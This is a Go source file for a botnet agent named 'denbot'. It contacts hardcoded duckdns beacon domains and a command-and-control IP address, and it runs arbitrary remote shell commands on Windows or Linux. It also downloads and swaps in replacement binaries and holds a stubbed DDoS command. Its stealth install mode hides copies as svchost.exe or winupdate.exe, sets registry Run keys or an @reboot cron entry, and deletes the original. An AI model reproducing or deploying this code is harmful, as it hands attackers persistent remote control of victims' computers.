package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

var (
	installFlag = flag.Bool("install", false, "stealth install mode")
)

type Command struct {
	Action   string   `json:"action"`
	Target   string   `json:"target,omitempty"`
	Duration int      `json:"duration,omitempty"`
	Rate     int      `json:"rate,omitempty"`
	Threads  int      `json:"threads,omitempty"`
	Proxies  []string `json:"proxies,omitempty"`
	AttackID string   `json:"attack_id,omitempty"`
	Cmd      string   `json:"cmd,omitempty"`
	URL      string   `json:"url,omitempty"`
	SHA256   string   `json:"sha256,omitempty"`
}

type Response struct {
	Type     string `json:"type"`
	AttackID string `json:"attack_id,omitempty"`
	Cmd      string `json:"cmd,omitempty"`
	Output   string `json:"output,omitempty"`
	Error    string `json:"error,omitempty"`
	Status   string `json:"status,omitempty"`
}

type BeaconRequest struct {
	Secret       string `json:"secret"`
	ID           string `json:"id"`
	OS           string `json:"os"`
	Version      string `json:"version"`
	ProxiesCount int    `json:"proxies_count"`
}

type BeaconResponse struct {
	C2      string   `json:"c2"`
	Domains []string `json:"domains"`
	Status  string   `json:"status"`
}

type Hello struct {
	Secret  string `json:"secret"`
	ID      string `json:"id"`
	OS      string `json:"os"`
	Version string `json:"version"`
}

type Heartbeat struct {
	Type     string `json:"type"`
	AttackID string `json:"attack_id,omitempty"`
	Status   string `json:"status,omitempty"`
	Sent     int    `json:"sent,omitempty"`
}

var (
	localConfig = struct {
		Domains []string
		C2      string
		Version string
		Secret  string
	}{
		Domains: []string{
			"synapsenet.duckdns.org:8443",
			"synapsenet2.duckdns.org:8443",
			"synapsenet666.duckdns.org:8443",
		},
		C2:      "176.100.94.8:4444",
		Version: "v4.7",
		Secret:  "foxden2026",
	}
	proxies   []string
	proxyURLs = []string{
		"https://api.openproxylist.xyz/http.txt",
		"https://proxy-list.download/api/v1/get?type=http",
	}
)

func main() {
	flag.Parse()
	rand.Seed(time.Now().UnixNano())

	if *installFlag {
		doStealthInstall()
		return
	}

	go dailyProxyRefresh()

	for {
		c2Addr := getCurrentC2()
		if c2Addr == "" {
			time.Sleep(20 * time.Second)
			continue
		}

		conn, err := net.DialTimeout("tcp", c2Addr, 10*time.Second)
		if err != nil {
			time.Sleep(15 * time.Second)
			continue
		}
		runAgentLoop(conn)
		conn.Close()
	}
}

func getCurrentC2() string {
	for _, domain := range localConfig.Domains {
		endpoint := "https://" + domain + "/beacon"
		client := &http.Client{
			Timeout: 8 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		}

		if len(proxies) > 0 {
			proxyURL := proxies[rand.Intn(len(proxies))]
			if !strings.HasPrefix(proxyURL, "http://") && !strings.HasPrefix(proxyURL, "https://") {
				proxyURL = "http://" + proxyURL
			}
			purl, err := url.Parse(proxyURL)
			if err == nil {
				client.Transport.(*http.Transport).Proxy = http.ProxyURL(purl)
			}
		}

		payload := BeaconRequest{
			Secret:       localConfig.Secret,
			ID:           getInstallID(),
			OS:           runtime.GOOS,
			Version:      localConfig.Version,
			ProxiesCount: len(proxies),
		}
		body, _ := json.Marshal(payload)
		resp, err := client.Post(endpoint, "application/json", bytes.NewReader(body))
		if err != nil {
			continue
		}
		if resp.StatusCode != 200 {
			resp.Body.Close()
			continue
		}

		var result BeaconResponse
		if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		if result.C2 != "" {
			return result.C2
		}
	}
	return ""
}

func runAgentLoop(conn net.Conn) {
	id := getInstallID()
	hello := Hello{
		Secret:  localConfig.Secret,
		ID:      id,
		OS:      runtime.GOOS,
		Version: localConfig.Version,
	}
	encoder := json.NewEncoder(conn)
	decoder := json.NewDecoder(conn)

	if err := encoder.Encode(hello); err != nil {
		return
	}

	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			hb := Heartbeat{
				Type:   "heartbeat",
				Status: "idle",
			}
			if err := encoder.Encode(hb); err != nil {
				return
			}
		default:
			_ = conn.SetReadDeadline(time.Now().Add(120 * time.Second))
			var cmd Command
			if err := decoder.Decode(&cmd); err != nil {
				return
			}
			if cmd.Action == "start_ddos" {
				go startAttack(cmd, encoder)
			} else if cmd.Action == "shell" {
				go executeShell(cmd, encoder)
			} else if cmd.Action == "download_update" {
				go downloadUpdate(cmd, encoder)
			}
		}
	}
}

func startAttack(cmd Command, encoder *json.Encoder) {
	fmt.Printf("[*] Attack %s started on %s for %ds\n", cmd.AttackID, cmd.Target, cmd.Duration)
	time.Sleep(time.Duration(cmd.Duration) * time.Second)
	resp := Response{
		Type:     "attack_complete",
		AttackID: cmd.AttackID,
		Status:   "completed",
	}
	encoder.Encode(resp)
}

func executeShell(cmd Command, encoder *json.Encoder) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		flag = "/c"
	} else {
		shell = "/bin/bash"
		flag = "-c"
	}

	execCmd := exec.Command(shell, flag, cmd.Cmd)
	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	errStr := ""
	if err != nil {
		errStr = err.Error()
	}

	resp := Response{
		Type:   "shell_result",
		Cmd:    cmd.Cmd,
		Output: stdout.String(),
		Error:  stderr.String() + errStr,
	}
	encoder.Encode(resp)
}

func downloadUpdate(cmd Command, encoder *json.Encoder) {
	if cmd.URL == "" {
		encoder.Encode(Response{
			Type:  "update_error",
			Error: "no URL provided",
		})
		return
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Get(cmd.URL)
	if err != nil {
		encoder.Encode(Response{
			Type:  "update_error",
			Error: fmt.Sprintf("download failed: %v", err),
		})
		return
	}
	defer resp.Body.Close()

	tmpFile := os.TempDir() + "/denbot-update"
	out, err := os.Create(tmpFile)
	if err != nil {
		encoder.Encode(Response{
			Type:  "update_error",
			Error: fmt.Sprintf("create temp file failed: %v", err),
		})
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, resp.Body); err != nil {
		encoder.Encode(Response{
			Type:  "update_error",
			Error: fmt.Sprintf("download copy failed: %v", err),
		})
		return
	}

	encoder.Encode(Response{
		Type:   "update_complete",
		Status: "updating",
	})

	execPath, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Rename(tmpFile, execPath)
		os.Exit(0)
	}()
}

func dailyProxyRefresh() {
	for {
		time.Sleep(24 * time.Hour)
		for _, u := range proxyURLs {
			resp, err := http.Get(u)
			if err != nil {
				continue
			}
			if resp.StatusCode != 200 {
				resp.Body.Close()
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			proxies = strings.Split(strings.TrimSpace(string(body)), "\n")
			break
		}
	}
}

func doStealthInstall() {
	fmt.Println("[*] Installing...")

	locations := getInstallLocations()
	execPath, _ := os.Executable()
	for _, loc := range locations {
		os.MkdirAll(filepath.Dir(loc), 0755)
		copyFile(execPath, loc)
	}

	addPersistence(locations)
	downloadProxies()
	selfDeleteOriginal()

	fmt.Println("[*] Done. File may be corrupted.")
	os.Exit(0)
}

func getInstallLocations() []string {
	home, _ := os.UserHomeDir()
	if runtime.GOOS == "windows" {
		app := os.Getenv("APPDATA")
		return []string{
			filepath.Join(app, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe"),
			filepath.Join(app, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "winupdate.exe"),
			filepath.Join(os.TempDir(), "svchost.exe"),
		}
	}
	return []string{
		filepath.Join(home, ".config", "autostart", "update.desktop"),
		filepath.Join(home, ".local", "bin", "update"),
		filepath.Join("/tmp", "svchost"),
	}
}

func addPersistence(locations []string) {
	if runtime.GOOS == "windows" {
		for _, loc := range locations {
			exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", filepath.Base(loc), "/t", "REG_SZ", "/d", loc, "/f").Run()
		}
	} else {
		cron := "@reboot " + locations[0] + " &"
		exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '"+cron+"') | crontab -").Run()
	}
}

func downloadProxies() {
	for _, u := range proxyURLs {
		resp, err := http.Get(u)
		if err != nil {
			continue
		}
		if resp.StatusCode != 200 {
			resp.Body.Close()
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		proxies = strings.Split(strings.TrimSpace(string(body)), "\n")
		break
	}
}

func selfDeleteOriginal() {
	execPath, _ := os.Executable()
	go func() {
		time.Sleep(2 * time.Second)
		os.Remove(execPath)
	}()
}

func getInstallID() string {
	hostname, _ := os.Hostname()
	return hostname + "-" + randomString(6)
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func copyFile(src, dst string) {
	in, _ := os.Open(src)
	defer in.Close()
	out, _ := os.Create(dst)
	defer out.Close()
	io.Copy(out, in)
}
